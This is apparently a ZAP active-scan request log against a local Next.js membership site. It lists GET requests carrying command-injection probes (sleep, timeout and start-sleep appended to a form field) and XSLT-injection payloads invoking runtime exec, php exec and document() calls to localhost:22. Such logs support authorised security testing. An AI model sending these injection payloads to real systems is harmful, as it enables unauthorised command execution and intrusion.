2551,Fri Sep 25 14:42:06 IST 2026,Fri Sep 25 14:42:06 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%22%3Bsleep+15.0%3B%22,200,OK,85,335,18965
2552,Fri Sep 25 14:42:06 IST 2026,Fri Sep 25 14:42:06 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%26sleep+15.0%26%27,200,OK,111,335,18961
2553,Fri Sep 25 14:42:06 IST 2026,Fri Sep 25 14:42:06 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%3Bsleep+15.0%3B%27,200,OK,90,335,18941
2554,Fri Sep 25 14:42:06 IST 2026,Fri Sep 25 14:42:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%26timeout+%2FT+15.0,200,OK,259,335,18957
2555,Fri Sep 25 14:42:07 IST 2026,Fri Sep 25 14:42:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%7Ctimeout+%2FT+15.0,200,OK,87,335,18947
2556,Fri Sep 25 14:42:07 IST 2026,Fri Sep 25 14:42:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%22%26timeout+%2FT+15.0%26%22,200,OK,54,335,19011
2557,Fri Sep 25 14:42:07 IST 2026,Fri Sep 25 14:42:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%22%7Ctimeout+%2FT+15.0,200,OK,82,335,18965
2558,Fri Sep 25 14:42:07 IST 2026,Fri Sep 25 14:42:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%26timeout+%2FT+15.0%26%27,200,OK,59,335,18987
2559,Fri Sep 25 14:42:07 IST 2026,Fri Sep 25 14:42:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%7Ctimeout+%2FT+15.0,200,OK,59,335,18953
2560,Fri Sep 25 14:42:07 IST 2026,Fri Sep 25 14:42:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%3Bstart-sleep+-s+15.0,200,OK,73,335,18959
2561,Fri Sep 25 14:42:05 IST 2026,Fri Sep 25 14:42:07 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%22%3Bstart-sleep+-s+15.0,200,OK,1824,345,11938274
2562,Fri Sep 25 14:42:07 IST 2026,Fri Sep 25 14:42:07 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%22%3Bstart-sleep+-s+15.0,200,OK,74,335,18977
2563,Fri Sep 25 14:42:08 IST 2026,Fri Sep 25 14:42:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%3Bstart-sleep+-s+15.0,200,OK,60,335,18965
2564,Fri Sep 25 14:42:08 IST 2026,Fri Sep 25 14:42:08 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%3Bstart-sleep+-s+15.0+%23,200,OK,60,335,18973
2565,Fri Sep 25 14:42:08 IST 2026,Fri Sep 25 14:42:08 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%27%3Bstart-sleep+-s+15.0,200,OK,155,345,11938274
2566,Fri Sep 25 14:42:08 IST 2026,Fri Sep 25 14:42:08 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%3Bstart-sleep+-s+15.0+%23,200,OK,43,345,11938274
2567,Fri Sep 25 14:42:09 IST 2026,Fri Sep 25 14:42:09 IST 2026,GET,http://localhost:3000/?_rsc=%3C,200,OK,46,303,2878
2568,Fri Sep 25 14:42:09 IST 2026,Fri Sep 25 14:42:09 IST 2026,GET,http://localhost:3000/?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,121,303,2878
2569,Fri Sep 25 14:42:09 IST 2026,Fri Sep 25 14:42:09 IST 2026,GET,http://localhost:3000,200,OK,130,533,27949
2570,Fri Sep 25 14:42:09 IST 2026,Fri Sep 25 14:42:09 IST 2026,GET,http://localhost:3000/?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,33,303,2878
2571,Fri Sep 25 14:42:09 IST 2026,Fri Sep 25 14:42:09 IST 2026,GET,http://localhost:3000/?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,96,303,2878
2572,Fri Sep 25 14:42:09 IST 2026,Fri Sep 25 14:42:09 IST 2026,GET,http://localhost:3000/__nextjs_font,404,Not Found,135,341,9953
2573,Fri Sep 25 14:42:09 IST 2026,Fri Sep 25 14:42:09 IST 2026,GET,http://localhost:3000/?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,46,303,2878
2574,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,42,303,2878
2575,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,37,303,2878
2576,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,82,303,2878
2577,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next,404,Not Found,178,341,9945
2578,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static,404,Not Found,58,341,9956
2579,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks,404,Not Found,11,265,9
2580,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/app,404,Not Found,8,265,9
2581,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/about,404,Not Found,7,265,9
2582,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/contact,404,Not Found,5,265,9
2583,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/faq,404,Not Found,9,265,9
2584,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/login,404,Not Found,5,265,9
2585,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/register,404,Not Found,6,265,9
2586,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3C,200,OK,4,342,142828
2587,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/css,404,Not Found,14,265,9
2588,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,5,342,142828
2589,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3C,200,OK,84,345,11938274
2590,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/css/app,404,Not Found,14,265,9
2591,Fri Sep 25 14:42:10 IST 2026,Fri Sep 25 14:42:10 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,5,342,142828
2592,Fri Sep 25 14:42:11 IST 2026,Fri Sep 25 14:42:11 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3C,200,OK,6,327,71262
2593,Fri Sep 25 14:42:11 IST 2026,Fri Sep 25 14:42:11 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,3,342,142828
2594,Fri Sep 25 14:42:11 IST 2026,Fri Sep 25 14:42:11 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,61,345,11938274
2595,Fri Sep 25 14:42:11 IST 2026,Fri Sep 25 14:42:11 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,5,327,71262
2596,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,8,327,71262
2597,Fri Sep 25 14:42:11 IST 2026,Fri Sep 25 14:42:11 IST 2026,GET,http://localhost:3000/_next/static/media,404,Not Found,20,265,9
2598,Fri Sep 25 14:42:11 IST 2026,Fri Sep 25 14:42:11 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,16,342,142828
2599,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3C,101,Switching Protocols,1,129,0
2600,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,130,345,11938274
2601,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,4,327,71262
2602,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,4,327,71262
2603,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,21,342,142828
2604,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,101,Switching Protocols,20,129,0
2605,Fri Sep 25 14:42:12 IST 2026,Fri Sep 25 14:42:12 IST 2026,GET,http://localhost:3000/about?_rsc=%3C,200,OK,42,303,3854
2606,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,6,342,142828
2607,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,69,345,11938274
2608,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=system-property%28%27xsl%3Avendor%27%29%2F%3E,101,Switching Protocols,2,129,0
2609,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,4,327,71262
2610,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,5,327,71262
2611,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,101,Switching Protocols,2,129,0
2612,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,4,342,142828
2613,Fri Sep 25 14:42:13 IST 2026,Fri Sep 25 14:42:13 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,47,303,3854
2614,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,51,345,11938274
2615,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,9,327,71262
2616,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,101,Switching Protocols,2,129,0
2617,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/about?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,44,303,3854
2618,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/about?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,32,303,3854
2619,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,101,Switching Protocols,1,129,0
2620,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,39,303,3854
2621,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,101,Switching Protocols,2,129,0
2622,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,101,Switching Protocols,22,129,0
2623,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:14 IST 2026,GET,http://localhost:3000/contact?_rsc=%3C,200,OK,75,303,3866
2624,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,56,303,3854
2625,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,52,303,3866
2626,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,43,303,3854
2627,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/faq?_rsc=%3C,200,OK,88,303,3842
2628,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,149,303,3866
2629,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/about?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,154,303,3854
2630,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3C,200,OK,206,315,25931
2631,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,244,303,3842
2632,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,201,303,3866
2633,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/faq?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,130,303,3842
2634,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,246,315,25931
2635,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,149,303,3866
2636,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/images,404,Not Found,520,341,9946
2637,Fri Sep 25 14:42:14 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,822,345,11938274
2638,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,128,315,25931
2639,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,67,303,3866
2640,Fri Sep 25 14:42:15 IST 2026,Fri Sep 25 14:42:15 IST 2026,GET,http://localhost:3000/faq?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,89,303,3842
2642,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,105,315,25931
2641,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,154,303,3842
2643,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,94,303,3866
2644,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,56,303,3842
2645,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/contact?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,116,303,3866
2646,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,113,315,25931
2647,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,97,303,3842
2648,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3C,200,OK,121,303,3854
2649,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/faq?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,160,303,3842
2650,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,152,303,3854
2651,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,231,315,25931
2652,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3C&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,278,335,18877
2653,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,61,303,3854
2654,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,54,315,25931
2655,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,89,303,3854
2656,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,136,335,19157
2657,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,36,303,3854
2658,Fri Sep 25 14:42:17 IST 2026,Fri Sep 25 14:42:17 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,116,315,25931
